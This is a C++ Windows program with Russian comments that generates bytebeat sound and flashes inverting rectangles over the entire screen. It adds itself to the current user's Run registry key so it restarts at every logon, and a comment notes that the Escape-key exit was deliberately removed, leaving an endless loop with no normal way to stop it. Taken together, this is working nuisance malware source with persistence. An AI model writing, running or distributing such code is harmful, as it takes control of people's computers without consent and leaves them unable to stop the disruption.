#include <windows.h>
#include <mmsystem.h>
#include <ctime>

// Подключаем библиотеку для работы со звуком
#pragma comment(lib, "winmm.lib")

// Настройки аудио (классический Bytebeat)
const int SAMPLE_RATE = 8000; 
const int BUFFER_SIZE = 4000; 

volatile DWORD globalT = 0;
volatile bool isRunning = true;

// Первая оригинальная формула Bytebeat
inline BYTE GenerateBytebeat(DWORD t) {
    return static_cast<BYTE>((((t * (t >> 8 | t >> 9) & 46 & t >> 8)) ^ (t & t >> 13 | t >> 6)) & 0xFF);
}

// Функция для автоматического добавления программы в автозагрузку реестра
void RegisterMyProgramForStartup() {
    HKEY hKey = nullptr;
    // Путь к ветке автозагрузки текущего пользователя
    const char* czStartName = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    // Имя параметра в реестре для вашей программы
    const char* czValueName = "GdiBytebeatEffects";

    // Получаем полный путь к текущему запущенному exe-файлу
    char szProgPath[MAX_PATH];
    GetModuleFileNameA(NULL, szProgPath, MAX_PATH);

    // Открываем раздел реестра с правами на запись
    if (RegOpenKeyExA(HKEY_CURRENT_USER, czStartName, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        // Записываем путь к файлу в реестр
        RegSetValueExA(hKey, czValueName, 0, REG_SZ, (const BYTE*)szProgPath, lstrlenA(szProgPath) + 1);
        RegCloseKey(hKey);
    }
}

// -------------------------------------------------------------
// ПОТОК ЗВУКА: Классическая WinAPI-потоковая функция
// -------------------------------------------------------------
DWORD WINAPI AudioThreadFunc(LPVOID lpParam) {
    HWAVEOUT hWaveOut = (HWAVEOUT)lpParam;
    
    char* audioBuf1 = new char[BUFFER_SIZE];
    char* audioBuf2 = new char[BUFFER_SIZE];

    WAVEHDR waveHdr1 = { audioBuf1, BUFFER_SIZE, 0, 0, 0, 0, nullptr, 0 };
    WAVEHDR waveHdr2 = { audioBuf2, BUFFER_SIZE, 0, 0, 0, 0, nullptr, 0 };

    waveOutPrepareHeader(hWaveOut, &waveHdr1, sizeof(WAVEHDR));
    waveOutPrepareHeader(hWaveOut, &waveHdr2, sizeof(WAVEHDR));

    for (int i = 0; i < BUFFER_SIZE; ++i) audioBuf1[i] = GenerateBytebeat(InterlockedIncrement(&globalT));
    for (int i = 0; i < BUFFER_SIZE; ++i) audioBuf2[i] = GenerateBytebeat(InterlockedIncrement(&globalT));

    waveOutWrite(hWaveOut, &waveHdr1, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &waveHdr2, sizeof(WAVEHDR));

    WAVEHDR* currentHeader = &waveHdr1;

    while (isRunning) {
        while (!(currentHeader->dwFlags & WHDR_DONE) && isRunning) {
            Sleep(1); 
        }

        if (!isRunning) break;

        for (int i = 0; i < BUFFER_SIZE; ++i) {
            DWORD t = InterlockedIncrement(&globalT);
            currentHeader->lpData[i] = GenerateBytebeat(t);
        }

        waveOutWrite(hWaveOut, currentHeader, sizeof(WAVEHDR));
        currentHeader = (currentHeader == &waveHdr1) ? &waveHdr2 : &waveHdr1;
    }

    waveOutUnprepareHeader(hWaveOut, &waveHdr1, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &waveHdr2, sizeof(WAVEHDR));
    delete[] audioBuf1;
    delete[] audioBuf2;

    return 0;
}

// -------------------------------------------------------------
// ГЛАВНЫЙ ПОТОК: Безумная непрерывная графика
// -------------------------------------------------------------
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Вызываем функцию добавления в автозагрузку при старте
    RegisterMyProgramForStartup();

    srand(static_cast<unsigned int>(time(0)));

    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);

    WAVEFORMATEX wfx = {};
    wfx.wFormatTag = WAVE_FORMAT_PCM;
    wfx.nChannels = 1;
    wfx.nSamplesPerSec = SAMPLE_RATE;
    wfx.nAvgBytesPerSec = SAMPLE_RATE;
    wfx.nBlockAlign = 1;
    wfx.wBitsPerSample = 8;

    HWAVEOUT hWaveOut = nullptr;
    if (waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL) != MMSYSERR_NOERROR) {
        return 1;
    }

    HANDLE hAudioThread = CreateThread(NULL, 0, AudioThreadFunc, hWaveOut, 0, NULL);

    // Изменено на истинно бесконечный цикл — проверка GetAsyncKeyState(VK_ESCAPE) полностью удалена
    while (true) {
        DWORD t = globalT; 
        BYTE soundValue = GenerateBytebeat(t);

        HDC hdcScreen = GetDC(0);

        int w = (soundValue % 200) + 50;  
        int h = ((soundValue >> 2) % 200) + 50;  
        int x = rand() % (screenWidth - w);
        int y = rand() % (screenHeight - h);

        COLORREF syncColor = RGB(soundValue, (soundValue ^ (t >> 4)) & 0xFF, (t >> 8) & 0xFF);
        HBRUSH hBrush = CreateSolidBrush(syncColor);
        HBRUSH hOldBrush = (HBRUSH)SelectObject(hdcScreen, hBrush);

        PatBlt(hdcScreen, x, y, w, h, PATINVERT);

        SelectObject(hdcScreen, hOldBrush);
        DeleteObject(hBrush);
        ReleaseDC(0, hdcScreen);

        Sleep(1); 
    }

    // Этот участок кода теперь недостижим в нормальных условиях
    isRunning = false;
    if (hAudioThread != NULL) {
        WaitForSingleObject(hAudioThread, INFINITE);
        CloseHandle(hAudioThread);
    }
    waveOutReset(hWaveOut);
    waveOutClose(hWaveOut);

    return 0;
}
